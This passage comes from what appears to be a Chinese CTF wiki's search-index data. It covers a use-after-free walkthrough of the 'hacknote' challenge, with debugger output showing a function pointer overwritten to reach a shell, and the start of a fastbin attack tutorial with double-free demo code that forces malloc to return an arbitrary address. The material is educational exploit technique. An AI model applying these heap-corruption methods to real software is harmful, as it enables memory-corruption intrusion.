ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x80486c2   add_note + 76      add      DWORD   PTR   [ eax ],   eax \n     0 x80486c4   add_note + 78      add      BYTE   PTR   [ ebx + 0x86a0cec ],   al \n     0 x80486ca   add_note + 84      call     0x80484e0   malloc@plt \n  \u2192    0 x80486cf   add_note + 89      add      esp ,   0x10   \u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002  gef \u27a4    n   1  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  0 x08048761   in   add_note   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x0804b008    \u2192    0x00000000  $ebx     :   0x0804b040    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b008    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x08048761    \u2192    add_note + 235   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x8048752   add_note + 220     mov      al ,   ds : 0x458b0804 \n     0 x8048757   add_note + 225     call     0x581173df \n     0 x804875c   add_note + 230     call     0x80484e0   malloc@plt \n  \u2192    0 x8048761   add_note + 235     add      esp ,   0x10   \u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002  gef \u27a4    x / 2 xw   0x804b008  0 x804b008:    0 x00000000    0x0804b018   \u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b  gef \u27a4    x / 2 xw   0x804b008  0 x804b008:    0 x08048986    0x0804b00a  gef \u27a4    x / i   0x08048986 \n    0 x8048986   magic :     push     ebp   \u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002  \u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b  [ + ]  Starting  local  process  ./hacknote : pid  35030  [ * ]  Switching to interactive mode\nflag { use_after_free } ----------------------\n       HackNote       \n----------------------\n  1 . Add note          \n  2 . Delete note       \n  3 . Print note        \n  4 . Exit              \n----------------------  \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b  gef \u27a4    heap-analysis-helper   [*]   This   feature   is   under   development ,   expect   bugs   and   unstability...  [+]   Tracking   malloc ()  [+]   Tracking   free ()  [+]   Tracking   realloc ()  [+]   Disabling   hardware   watchpoints   ( this   may   increase   the   latency )  [+]   Dynamic   breakpoints   correctly   setup ,   GEF   will   break   execution   if   a   possible   vulnerabity   is   found.  [*]   Note:   The   heap   analysis   slows   down   noticeably   the   execution.   gef \u27a4    c  Continuing.  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   malloc ( 32 ) = 0x804b018  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 32 ) = 0x804b050  [+]   Heap-Analysis   -   free ( 0x804b018 )  [+]   Heap-Analysis   -   watching   0x804b018  [+]   Heap-Analysis   -   free ( 0x804b008 )  [+]   Heap-Analysis   -   watching   0x804b008  [+]   Heap-Analysis   -   free ( 0x804b050 )  [+]   Heap-Analysis   -   watching   0x804b050  [+]   Heap-Analysis   -   free ( 0x804b040 )  [+]   Heap-Analysis   -   watching   0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b040  [+]   Heap-Analysis   -   malloc ( 8 ) = 0x804b008  [+]   Heap-Analysis   -   Cleaning   up  [+]   Heap-Analysis   -   Re-enabling   hardware   watchpoints  [ New   process   36248 ]  process   36248   is   executing   new   program :   / bin / dash  [ New   process   36249 ]  process   36249   is   executing   new   program :   / bin / cat  [ Inferior   3   ( process   36249 )   exited   normally ]   \u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002", 
            "title": "\u5229\u7528\u811a\u672c"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_6", 
            "text": "2016 HCTF fheap", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/", 
            "text": "Fastbin Attack\n\n\n\u4ecb\u7ecd\n\n\nfastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a\n\n\n\n\n\u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d\n\n\n\n\n\u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a\n\n\n\n\nFastbin Double Free\n\n\nHouse of Spirit\n\n\nAlloc to Stack\n\n\nArbitrary Alloc\n\n\n\n\n\u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 \nfree\n \u51fd\u6570\u91ca\u653e\n\u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk\n\uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 \nfd\n \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 \nmalloc\n \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u539f\u7406\n\n\nfastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002\n\u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x30);\n    chunk2=malloc(0x30);\n    chunk3=malloc(0x30);\n    //\u8fdb\u884c\u91ca\u653e\n    free(chunk1);\n    free(chunk2);\n    free(chunk3);\n    return 0;\n}\n\n\n\u91ca\u653e\u524d\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041 \n=== chunk2\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041 \n=== chunk3\n0x602090:   0x0000000000000000  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41 \n=== top chunk\n\n\n\u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e\n\n0x602000:   0x0000000000000000  0x0000000000000041 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000041 \n=== chunk2\n0x602050:   0x0000000000602000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000041 \n=== chunk3\n0x602090:   0x0000000000602040  0x0000000000000000\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000020f41 \n=== top chunk\n\n\n\u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\n\nFastbins[idx=2, size=0x30,ptr=0x602080]\n===\nChunk(fd=0x602040, size=0x40, flags=PREV_INUSE)\n===\nChunk(fd=0x602000, size=0x40, flags=PREV_INUSE)\n===\nChunk(fd=0x000000, size=0x40, flags=PREV_INUSE) \n\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9\n\n\n\nFastbin Double Free\n\n\n\u4ecb\u7ecd\n\n\nFastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002\n\n\nFastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0\n\n\n\n\nfastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a\n\n\nfastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\n\n\n\n\n/* Another simple check: make sure the top of the bin is not the\n       record we are going to add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n      {\n        errstr = \ndouble free or corruption (fasttop)\n;\n        goto errout;\n}\n\n\n\n\n\u6f14\u793a\n\n\n\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6\n\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk1);\n    return 0;\n}\n\n\n\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002\n\n*** Error in `./tst\n: double free or corruption (fasttop): 0x0000000002200010 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]\n./tst[0x4005a2]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]\n./tst[0x400499]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n02200000-02221000 rw-p 00000000 00:00 0                                  [heap]\n7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 \n7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 \n7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 \n7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 \n7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 \n7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 \n7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]\n7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]\n7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8)\n\n\n\u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n    return 0;\n}\n\n\n\u7b2c\u4e00\u6b21\u91ca\u653e\nfree(chunk1)\n\n\n\n\n\u7b2c\u4e8c\u6b21\u91ca\u653e\nfree(chunk2)\n\n\n\n\n\u7b2c\u4e09\u6b21\u91ca\u653e\nfree(chunk1)\n\n\n\n\n\u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002\n\u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=\nchunk1=\nchun2=\nchunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002\n\n\ntypedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nCHUNK bss_chunk;\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    void *chunk_a,*chunk_b;\n\n    bss_chunk.size=0x21;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n\n    chunk_a=malloc(0x10);\n    *(long long *)chunk_a=\nbss_chunk;\n    malloc(0x10);\n    malloc(0x10);\n    chunk_b=malloc(0x10);\n    printf(\n%p\n,chunk_b);\n    return 0;\n}\n\n\n\u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684\nCHUNK bss_chunk\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x601080 \nbss_chunk\n:   0x0000000000000000  0x0000000000000021\n0x601090 \nbss_chunk+16\n:0x0000000000000000  0x0000000000000000\n0x6010a0:               0x0000000000000000  0x0000000000000000\n0x6010b0:               0x0000000000000000  0x0000000000000000\n0x6010c0:               0x0000000000000000  0x0000000000000000\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86\nbss_chunk.size=0x21;\n\u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\n\n*** Error in `./tst\n: malloc(): memory corruption (fast): 0x0000000000601090 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]\n./tst[0x400636]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]\n./tst[0x4004e9]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]\n7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 \n7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 \n7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 \n7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 \n7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 \n7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 \n7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]\n7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]\n7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8)\n\n\n_int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b\n\nif (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))\n    {\n      errstr = \nmalloc(): memory corruption (fast)\n;\n    errout:\n      malloc_printerr (check_action, errstr, chunk2mem (victim));\n      return NULL;\n}\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002\n\u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002\n\n\nHouse Of Spirit\n\n\n\u4ecb\u7ecd\n\n\nHouse of Spirit \u662f \nthe Malloc Maleficarum\n \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002\n\n\n\u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d\n\u6307\u5b9a\u5730\u5740\n\u7684 chunk \u7684\u76ee\u7684\u3002\n\n\n\u8981\u60f3\u6784\u9020 